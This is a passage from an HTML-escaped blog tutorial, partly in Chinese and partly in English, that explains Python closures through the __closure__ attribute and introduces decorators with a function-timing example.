&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  					 &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; oldboy have money: 1000  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; (&amp;lt;cell at 0x0090D050: int object at 0x009B9570&amp;gt;, &amp;lt;cell at 0x00900FF0: str object at 0x0090D060&amp;gt;)  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cell_contents&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 1000  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;oldboy_info&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__closure__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;cell_contents&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; oldboy  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上例中，第6行的打印的name和money变量，是对上级作用域（bar函数）和顶级嵌套作用域（foo函数）的引用。通过第13~14行的打印可以看出，oldboy_info函数的&lt;code&gt;__closure__&lt;&#x2F;code&gt;内包含了2个变量。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;understanding-decorators-in-python&quot;&gt;Understanding Decorators in Python&lt;a class=&quot;zola-anchor&quot; href=&quot;#understanding-decorators-in-python&quot; aria-label=&quot;Anchor link for: understanding-decorators-in-python&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;为了锻炼英语，这里使用英文。&lt;&#x2F;p&gt;
&lt;p&gt;A decorator in Python is a powerful feature that allows us to modify or extend the behavior of functions. It can be thought of as a more advanced form of closure. Here, I’ll explain this concept through examples.&lt;&#x2F;p&gt;
&lt;p&gt;To measure the time taken by a function, you might first try something like this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;function is running..&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;function run time &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; output:
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt;function is running..
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; function run time  3.0023677349090576
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;However, if we want to measure the time of &lt;strong&gt;1 million&lt;&#x2F;strong&gt; function calls, this approach becomes inefficient. Instead, we can create another function to measure the execution time of other functions.&lt;&#x2F;p&gt;
&lt;p&gt;We can define a &lt;code&gt;timer&lt;&#x2F;code&gt; function to measure the execution time of another function:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;timer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-comment z-block z-documentation z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-begin z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt; prints function time &lt;span class=&quot;z-punctuation z-definition z-comment z-end z-python&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  	&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 调用函数的执行  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;function &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt; run time &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;%&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-sequence z-tuple z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;func&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-support z-variable z-magic z-python&quot;&gt;__name__&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-sequence z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;time&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;start&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 打印函数执行的时间  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
